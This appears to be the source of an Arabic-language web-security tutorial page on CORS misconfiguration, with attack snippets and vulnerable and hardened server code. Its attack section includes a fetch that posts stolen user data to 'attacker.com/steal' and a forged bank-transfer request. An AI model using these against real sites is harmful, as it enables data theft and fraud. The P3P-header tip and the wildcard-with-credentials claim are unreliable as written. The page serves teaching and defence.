'use client'
import VulnerabilityLayout, { VulnSection, CodeBlock, InfoBox, ListItem } from '@/components/VulnerabilityLayout'
import VideoSection from '@/components/VideoSection'
import ToolsSection from '@/components/ToolsSection'
import LabsSection from '@/components/LabsSection'
import Quiz from '@/components/Quiz'
import ShareButtons from '@/components/ShareButtons'

export default function CORSPage() {
  return (
    <VulnerabilityLayout
      icon="🌐"
      titleAr="أخطاء سياسة الموارد المشتركة"
      titleEn="Cross-Origin Resource Sharing (CORS) Misconfiguration"
      severity="medium"
      owasp="A5:2017"
    >
      <ShareButtons title="CORS - أخطاء سياسة الموارد المشتركة" url="https://web-security-guide.vercel.app/vulnerabilities/cors" />

      <VulnSection title="تعريف CORS" icon="📖">
        <p style={{ color: '#cccccc', fontSize: '14px', lineHeight: '1.8' }}>
          سياسة الموارد المشتركة بين المواقع (CORS) هي آلية أمنية تسمح للمواقع الويب بالوصول للموارد من نطاق مختلف. عندما يتم تكوين CORS بشكل غير صحيح، يمكن للمهاجم استغلاله لسرقة البيانات أو تنفيذ هجمات CSRF.
        </p>
      </VulnSection>

      <VulnSection title="كيف يعمل CORS" icon="🔍">
        <InfoBox type="info">
          <strong>آلية العمل:</strong>
        </InfoBox>
        <ListItem>يرسل المتصفح طلب مع Origin header</ListItem>
        <ListItem>يتحقق الخادم من Origin</ListItem>
        <ListItem>يرسل الخادم Access-Control-Allow-Origin header</ListItem>
        <ListItem>يسمح المتصفح بالوصول إذا كان Origin مسموحاً</ListItem>
      </VulnSection>

      <VulnSection title="أنواع أخطاء CORS" icon="🔍">
        <InfoBox type="warning">
          <strong>1. Access-Control-Allow-Origin: *</strong> - السماح لأي موقع بالوصول
        </InfoBox>
        <CodeBlock title="مثال على CORS ضعيف" code={`// الرد
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true

// النتيجة: أي موقع يمكنه قراءة البيانات`} />

        <InfoBox type="danger">
          <strong>2. عكس Origin في الرد</strong> - إرسال Origin الأصلي في الرد
        </InfoBox>
        <CodeBlock title="مثال على عكس Origin" code={`// الطلب
Origin: https://attacker.com

// الرد
Access-Control-Allow-Origin: https://attacker.com
Access-Control-Allow-Credentials: true

// النتيجة: يمكن للمهاجم الوصول للبيانات`} />

        <InfoBox type="danger">
          <strong>3. فلترة غير صحيحة</strong> - فلترة غير صحيحة للـ Origin
        </InfoBox>
        <CodeBlock title="مثال على فلترة خاطئة" code={`// الكود الضعيف
if (origin.includes("example.com")) {
  header("Access-Control-Allow-Origin: " + origin);
}

// المهاجم يستخدم
Origin: https://example.com.attacker.com

// النتيجة: يمر الفلتر`} />
      </VulnSection>

      <VulnSection title="أمثلة على الهجمات" icon="💻">
        <CodeBlock title="1. سرقة البيانات" code={`// صفحة مغرضة على attacker.com
fetch('https://api.example.com/user', {
  credentials: 'include'
})
.then(response => response.json())
.then(data => {
  // سرقة البيانات
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify(data)
  });
});`} />

        <CodeBlock title="2. هجوم CSRF" code={`// صفحة مغرضة
fetch('https://bank.com/transfer', {
  method: 'POST',
  credentials: 'include',
  body: JSON.stringify({
    to: 'attacker',
    amount: 10000
  })
});`} />

        <CodeBlock title="3. قراءة Cookies" code={`// إذا كان CORS مكون بشكل خاطئ
// يمكن للمهاجم قراءة Cookies
fetch('https://api.example.com/cookies', {
  credentials: 'include'
})
.then(response => response.json())
.then(cookies => {
  // إرسال Cookies للمهاجم
});`} />
      </VulnSection>

      <VulnSection title="أمثلة كود مصاب ومحصن" icon="💻">
        <CodeBlock title="❌ كود مصاب" variant="vulnerable" code={`// Node.js - كود مصاب
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Credentials', 'true');
  next();
});

// PHP - كود مصاب
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Credentials: true');`} />

        <CodeBlock title="✅ كود محصن" variant="secure" code={`// Node.js - كود محصن
const allowedOrigins = ['https://example.com', 'https://app.example.com'];

app.use((req, res, next) => {
  const origin = req.headers.origin;
  
  if (allowedOrigins.includes(origin)) {
    res.header('Access-Control-Allow-Origin', origin);
    res.header('Access-Control-Allow-Credentials', 'true');
    res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');
    res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  }
  
  next();
});

// PHP - كود محصن
$allowed_origins = ['https://example.com', 'https://app.example.com'];
$origin = $_SERVER['HTTP_ORIGIN'];

if (in_array($origin, $allowed_origins)) {
  header('Access-Control-Allow-Origin: ' . $origin);
  header('Access-Control-Allow-Credentials: true');
}

// التحقق من Methods
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
  header('Access-Control-Allow-Methods: GET, POST, PUT, DELETE');
  header('Access-Control-Allow-Headers: Content-Type, Authorization');
  exit;
}`} />
      </VulnSection>

      <VulnSection title="طرق الحماية" icon="🛡️">
        <InfoBox type="success">
          <strong>1. استخدام قائمة بيضاء</strong> - حدد فقط المواقع المسموح بها
        </InfoBox>
        <ListItem>حدد قائمة بمواقع الويب المسموح بها</ListItem>
        <ListItem>تحقق من Origin في كل طلب</ListItem>
        <ListItem>لا تستخدم wildcard (*) مع credentials</ListItem>

        <InfoBox type="success">
          <strong>2. التحقق من Origin بشكل صحيح</strong> - لا تعتمد على includes() فقط
        </InfoBox>
        <CodeBlock title="تحقق صحيح من Origin" code={`function isAllowedOrigin(origin) {
  const allowedOrigins = ['https://example.com'];
  
  // التحقق الدقيق
  return allowedOrigins.includes(origin);
  
  // أو باستخدام regex
  return /^https:\\/\\/(.*\\.)?example\\.com$/.test(origin);
}`} />

        <InfoBox type="success">
          <strong>3. تقييد Methods و Headers</strong> - حدد فقط الطريقة والرؤوس المسموحة
        </InfoBox>
        <ListItem>حدد Access-Control-Allow-Methods</ListItem>
        <ListItem>حدد Access-Control-Allow-Headers</ListItem>
        <ListItem>لا تسمح بجميع الطرق والرؤوس</ListItem>

        <InfoBox type="success">
          <strong>4. استخدام P3P header</strong> - لتحسين التوافق
        </InfoBox>
        <CodeBlock title="إعداد P3P" code={`header('P3P: CP="This is not a privacy policy"');`} />
      </VulnSection>

      <VulnSection title="نصائح أمنية" icon="💡">
        <InfoBox type="info">
          <strong>القاعدة الذهبية:</strong> لا تسمح أبداً بـ Access-Control-Allow-Origin: * مع credentials
        </InfoBox>
        <ListItem>استخدم قائمة بيضاء لمواقع الويب</ListItem>
        <ListItem>تحقق من Origin بشكل صارم</ListItem>
        <ListItem>حدد Methods و Headers المسموحة</ListItem>
        <ListItem>راجع إعدادات CORS بشكل دوري</ListItem>
      </VulnSection>

      <VulnSection title="الأخطاء الشائعة" icon="⚠️">
        <InfoBox type="danger">
          <strong>❌ استخدام Access-Control-Allow-Origin: *</strong> - يسمح لأي موقع بالوصول
        </InfoBox>
        <InfoBox type="danger">
          <strong>❌ عكس Origin في الرد</strong> - يسمح للمهاجم بالوصول
        </InfoBox>
        <InfoBox type="danger">
          <strong>❌ فلترة خاطئة للـ Origin</strong> - يمكن تجاوزها بسهولة
        </InfoBox>
      </VulnSection>

      <section className="mb-6">
        <LabsSection slug="cors" />
      </section>

      <section className="mb-6">
        <ToolsSection slug="cors" />
      </section>

      <section className="mb-6">
        <Quiz slug="cors" />
        <VideoSection slug="cors" />
      </section>
    </VulnerabilityLayout>
  )
}
